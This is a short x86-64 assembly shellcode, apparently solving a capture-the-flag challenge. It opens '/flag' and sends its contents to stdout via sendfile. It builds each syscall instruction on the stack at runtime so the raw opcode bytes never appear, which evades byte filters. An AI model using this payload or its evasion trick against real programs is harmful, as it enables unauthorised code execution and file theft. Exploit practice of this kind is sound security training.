.global _start
.intel_syntax noprefix

_start:
	mov al , 2
	lea edi, [rip+file]
	xor esi, esi

	push 0xc3050e
	inc byte ptr [rsp]
	lea r12, [rsp]
	call r12

	mov esi, eax
	xor edi, edi
	inc edi
	xor edx, edx
	mov r10b, 20
	mov al, 40
	push 0xc3050e
	inc byte ptr [rsp]
	lea r12, [rsp]
	call r12

	mov al, 60
	push 0xc3050e
	inc byte ptr [rsp]
	lea r12, [rsp]
	call r12
file:
	.string "/flag"


